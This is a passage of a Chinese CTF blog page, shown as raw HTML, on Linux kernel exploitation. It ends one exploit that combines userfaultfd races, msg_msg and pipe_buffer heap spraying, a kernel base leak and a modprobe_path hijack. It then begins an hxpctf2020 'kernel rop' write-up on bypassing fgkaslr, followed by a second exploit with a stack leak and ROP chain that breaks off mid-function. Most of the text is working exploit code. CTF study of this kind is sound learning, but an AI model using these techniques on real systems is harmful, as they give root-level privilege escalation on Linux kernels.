class="line">    sem_wait(&amp;sem_addmsg);</span><br><span class="line">    delete(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// RED puts(&quot;in&quot;); CLOSE</span></span><br><span class="line">    <span class="type">int</span> ret=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ms_qid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">        <span class="keyword">if</span> (ms_qid[i] &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] msgget!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x2</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(msg_buf, <span class="string">&#x27;A&#x27;</span> + i, <span class="number">0X400</span> - <span class="number">8</span>);</span><br><span class="line">        ret = msgsnd(ms_qid[<span class="number">0</span>], msg_buf, <span class="number">0x400</span> - <span class="number">0x30</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] msgsnd!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    RED <span class="title function_">puts</span><span class="params">(<span class="string">&quot;[*] msg_msg spraying finish.&quot;</span>)</span>; CLOSE</span><br><span class="line">    <span class="title function_">sem_post</span><span class="params">(&amp;sem_editmsg)</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">fault_handler_thread2</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> uffd = (<span class="type">unsigned</span> <span class="type">long</span>) arg;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] edit heap-&gt;next handler created&quot;</span>);</span><br><span class="line">    <span class="type">int</span> nready;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] edit heap-&gt;next handler unblocked&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    sem_post(&amp;edit_heap_next);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    sem_wait(&amp;edit_down);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="type">char</span>* page = (<span class="type">char</span>*) mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED)</span><br><span class="line">    &#123;</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    <span class="comment">// init page</span></span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    <span class="built_in">memcpy</span>(page,fake_ops_buf,<span class="number">0x208</span>);</span><br><span class="line">    <span class="comment">// leak(page,0x208);</span></span><br><span class="line">    <span class="comment">// strcpy(page,&quot;Lotus_just_Test&quot;);</span></span><br><span class="line">    uc.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line">    uc.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] edit heap-&gt;next handler down!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">UAF2</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    sem_wait(&amp;edit_heap_next);</span><br><span class="line">    delete(<span class="number">0</span>);</span><br><span class="line">    sem_post(&amp;edit_down);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">modprobe_path_hijack</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Returned to userland, setting up for fake modprobe&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;#!/bin/sh\nchmod 777 /flag\n&#x27; &gt; /tmp/Lotus.sh&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/Lotus.sh&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/fake&quot;</span>);</span><br><span class="line">    <span class="comment">// system(&quot;cat /proc/sys/kernel/modprobe&quot;);</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Run unknown file&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/tmp/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;ls -al /flag&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    RED <span class="title function_">puts</span><span class="params">(<span class="string">&quot;[*]Get shell!&quot;</span>)</span>; CLOSE</span><br><span class="line">    <span class="title function_">sleep</span><span class="params">(<span class="number">5</span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="type">pthread_t</span> <span class="type">edit_t</span>,<span class="type">edit2_t</span>;</span><br><span class="line"> </span><br><span class="line">    msg_buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(msg_buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    fd = open(<span class="string">&quot;/dev/kernelpwn&quot;</span>,O_RDWR);</span><br><span class="line">    buf = (<span class="type">char</span>*) mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>); <span class="comment">//for edit msg-&gt;m_ts</span></span><br><span class="line"> </span><br><span class="line">    buf2 = (<span class="type">char</span>*) mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);<span class="comment">//for spray the msg_msg and edit msg-&gt;next</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    RegisterUserfault(buf,fault_handler_thread);</span><br><span class="line">    RegisterUserfault(buf2,fault_handler_thread2);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    sem_init(&amp;sem_addmsg,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    sem_init(&amp;sem_editmsg,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    sem_init(&amp;edit_heap_next,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    sem_init(&amp;sem_edit_msg_for_modpath,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    sem_init(&amp;edit_down,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    add(<span class="string">&quot;TEST_chunk&quot;</span>);</span><br><span class="line">    pthread_create(&amp;<span class="type">edit_t</span>,<span class="literal">NULL</span>,UAF,<span class="number">0</span>);</span><br><span class="line">    pthread_create(&amp;<span class="type">edit2_t</span>,<span class="literal">NULL</span>,UAF2,<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    edit(<span class="number">0</span>,<span class="number">0x20</span>,buf);</span><br><span class="line">    GREEN <span class="title function_">puts</span><span class="params">(<span class="string">&quot;[*]Write in!&quot;</span>)</span>; CLOSE</span><br><span class="line"> </span><br><span class="line">    <span class="title function_">for</span> <span class="params">(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1</span>; i++)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            RED <span class="title function_">puts</span><span class="params">(<span class="string">&quot;failed to create pipe!&quot;</span>)</span>; CLOSE</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (write(pipe_fd[i][<span class="number">1</span>], <span class="string">&quot;_Lotus_&quot;</span>, <span class="number">8</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            RED <span class="title function_">puts</span><span class="params">(<span class="string">&quot;failed to write the pipe!&quot;</span>)</span>; CLOSE</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    RED <span class="title function_">puts</span><span class="params">(<span class="string">&quot;[*] pipe_buffer spraying finish.&quot;</span>)</span>; CLOSE</span><br><span class="line"> </span><br><span class="line">    <span class="title function_">memset</span><span class="params">(tmp_buf, <span class="number">0</span>, <span class="number">0x1000</span>)</span>;</span><br><span class="line">    <span class="keyword">if</span>(peekMsg(ms_qid[<span class="number">0</span>],tmp_buf,<span class="number">0xe00</span>,<span class="number">0</span>)&lt;<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        RED <span class="title function_">puts</span><span class="params">(<span class="string">&quot;[*]Leak error!&quot;</span>)</span>; CLOSE</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// leak(tmp_buf,0xd00);</span></span><br><span class="line">    kernel_base = tmp_buf[<span class="number">0x7e8</span>/<span class="number">8</span>]<span class="number">-0x103ed80</span>;</span><br><span class="line">    <span class="type">size_t</span> pipe_addr =  tmp_buf[<span class="number">0x3e0</span>/<span class="number">8</span>]+<span class="number">0xc00</span>;</span><br><span class="line">    BLUE <span class="title function_">printf</span><span class="params">(<span class="string">&quot;[*]Kernel_base: 0x%llx\n&quot;</span>,kernel_base)</span>; CLOSE</span><br><span class="line">    BLUE <span class="title function_">printf</span><span class="params">(<span class="string">&quot;[*]pipe_addr: 0x%llx\n&quot;</span>,pipe_addr)</span>; CLOSE</span><br><span class="line"> </span><br><span class="line">    <span class="title function_">close</span><span class="params">(pipe_fd[<span class="number">0</span>][<span class="number">0</span>])</span>;</span><br><span class="line">    close(pipe_fd[<span class="number">0</span>][<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">// size_t push_rsi_pop_rsp = real(0xffffffff81934056);//push rsi; pop rsp; retf;</span></span><br><span class="line">    <span class="comment">// size_t push_rsi_pop_rbp = real(0xffffffff81422d1f);//push rsi; pop rbp; ret;</span></span><br><span class="line">    <span class="comment">// size_t call_rsi_leave_ret = real(0xffffffff81c0114d);//call rsi; nop; nop; nop; leave; ret;</span></span><br><span class="line">    <span class="type">size_t</span> modprobe_path = real(<span class="number">0xffffffff82a6c000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(fake_ops_buf, <span class="number">0x61</span>,<span class="number">0x800</span>);</span><br><span class="line"> </span><br><span class="line">    fake_ops_buf[<span class="number">0x200</span>/<span class="number">8</span>] = modprobe_path<span class="number">-0xc0</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    add(<span class="string">&quot;Lotus_chunk&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    edit(<span class="number">0</span>,<span class="number">0x208</span>,buf2);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">0x3</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ms_qid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT);</span><br><span class="line">        <span class="keyword">if</span> (ms_qid[i] &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] msgget!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> modprobe_path_buf[<span class="number">0x80</span>];</span><br><span class="line">    <span class="built_in">memset</span>(modprobe_path_buf,<span class="number">0</span>,<span class="number">0x400</span>);</span><br><span class="line">    <span class="type">int</span> idx=<span class="number">0x34</span>;</span><br><span class="line">    modprobe_path_buf[idx++]=real(<span class="number">0xffffffff82a6c108</span>);</span><br><span class="line">    modprobe_path_buf[idx++]=real(<span class="number">0xffffffff82a6c108</span>);</span><br><span class="line">    modprobe_path_buf[idx++]=<span class="number">0x32</span>;</span><br><span class="line"> </span><br><span class="line">    modprobe_path_buf[<span class="number">0</span>]=<span class="number">0xdeadbeef</span>;</span><br><span class="line"> </span><br><span class="line">    modprobe_path_buf[<span class="number">0x13</span>]=<span class="number">0x746f4c2f706d742f</span>;</span><br><span class="line">    modprobe_path_buf[<span class="number">0x14</span>]=<span class="number">0x68732e7375</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">0x3</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="type">int</span> ret = msgsnd(ms_qid[i], modprobe_path_buf, <span class="number">0x400</span> - <span class="number">0x30</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[x] msgsnd!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    RED <span class="title function_">puts</span><span class="params">(<span class="string">&quot;[*]edit modprobe_path success.&quot;</span>)</span>; CLOSE</span><br><span class="line">    <span class="title function_">modprobe_path_hijack</span><span class="params">()</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="hxpctf2020-kernel-rop"><a href="#hxpctf2020-kernel-rop" class="headerlink" title="hxpctf2020-kernel rop"></a>hxpctf2020-kernel rop</h2><p>这题本身没什么东西,就是直接贴脸的栈溢出</p><p>不过比较不同的是开启了fgkaslr保护,这个还是第一次遇到,于是单独记录一下</p><p>题目常规保护smap,smep,kaslr,kpti基本都开了</p><p>模块也没什么好分析的</p><p>注册了read和wrtie,然后就是十分明显的栈溢出</p><p>要按照往常的思路,直接泄露canary和text段,然后直接rop提权就行了,</p><p>但是因为fgkaslr的存在,我们的利用多了不少限制</p><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>首先就是泄露canary,然后我们需要在栈上找一个位于<code>.text</code>区的地址</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-03-29_104342.png" alt=""></p><p>使用该地址得到内核的基址</p><p>然后<strong>就可以使用<code>.text</code>节区的gadget</strong>了,此时可以去修改<code>modprobe_path</code>,亦或者进一步得到<code>commit_creds</code>和<code>prerpare_kernel_cred</code></p><p>要得到被随机化的函数指针,首先因为已经泄露了内核基址,所以完全可以得到<code>__ksymtab_func_name</code></p><p>然后再利用如下这样的gadget,并辅以一些内联汇编,完全可以得到函数随机化后的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff81004d11: pop rax; ret; [0x4d11]</span><br><span class="line">0xffffffff81015a7f: mov rax, qword ptr [rax]; pop rbp; ret; [0x15a7f]</span><br></pre></td></tr></table></figure><p>如果选择修改<code>modprobe_path</code>的话,就需要找到一些可以<code>mov [reg],reg</code>这样的寄存器修改<code>modprobe_path</code>内存变量</p><p>之后就是常规做法了</p><p><strong>exp:</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_stack</span><span class="params">(<span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span> *)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_state</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fetch_commit</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_prep</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fetch_prep</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">make_cred</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">fetch_cred</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">send_cred</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">getshell</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fetch;</span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> commit_creds, prepare_kcred, ksymtab_commit_creds, ksymtab_prepare_kcred;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> canary, image_base;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> cred_struct_ptr;</span><br><span class="line"></span><br><span class="line"><span class="comment">//arbitrary read gadgets</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> pop_rax; <span class="comment">//pop rax ; ret</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> mov_eax_pop; <span class="comment">//mov eax, dword ptr [rax] ; pop rbp ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//other gadgets</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> kpti_trampoline; <span class="comment">//followed by 2 pops</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> pop_rdi;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">save_state();</span><br><span class="line"></span><br><span class="line">fd = open(<span class="string">&quot;/dev/hackme&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+]Leaking Stack...\n&quot;</span>);</span><br><span class="line"><span class="type">int</span> size = <span class="number">50</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> buf[size];</span><br><span class="line">leak_stack(size, buf);</span><br><span class="line"></span><br><span class="line">canary = buf[<span class="number">16</span>];</span><br><span class="line">image_base = buf[<span class="number">38</span>]<span class="number">-0xa157</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+]Canary: %lx\n&quot;</span>, canary);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+]Image Base: %lx\n&quot;</span>, image_base);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rax = image_base + <span class="number">0x4d11</span>;</span><br><span class="line">mov_eax_pop = image_base + <span class="number">0x15a80</span>;</span><br><span class="line">kpti_trampoline = image_base + <span class="number">0x200f26</span>;</span><br><span class="line"></span><br><span class="line">ksymtab_commit_creds = image_base + <span class="number">0xf87d90</span>;</span><br><span class="line">ksymtab_prepare_kcred = image_base + <span class="number">0xf8d4fc</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//leak commit_creds</span></span><br><span class="line"><span class="type">int</span> offset = <span class="number">16</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> payload[<span class="number">50</span>];</span><br><span class="line">payload[offset++] = canary;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = pop_rax;</span><br><span class="line">payload[offset++] = ksymtab_commit_creds;</span><br><span class="line">payload[offset++] = mov_eax_pop;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = kpti_trampoline;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = <span class="number">0</span>;</span><br><span class="line">payload[offset++] = (<span class="type">unsigned</span> <span class="type">long</span>)fetch_commit;</span><br><span class="line">payload[offset++] = user_cs;</span><br><span class="line">payload[offset++] = user_rflags;</span><br><span class="line">payload[offset++] = user_sp;</span><br><span class="line">payload[offset++] = user_ss;</span><br><span class="line">write(fd, payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">leak_stack</span><span class="params">(<span class="type">int</span> size, <span class="type">unsigned</span> <span class="type">long</span> * buf)</span></span><br><span class="line">&#123;</span><br><span class="line">read(fd, buf, size*<span class="number">8</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[%d]: %lx\n&quot;</span>, i, buf[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_state</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">__asm__</span><br><span class="line">(</span><br><span class="line"> <span class="string">&quot;.intel_syntax noprefix;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line"><span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line"><span 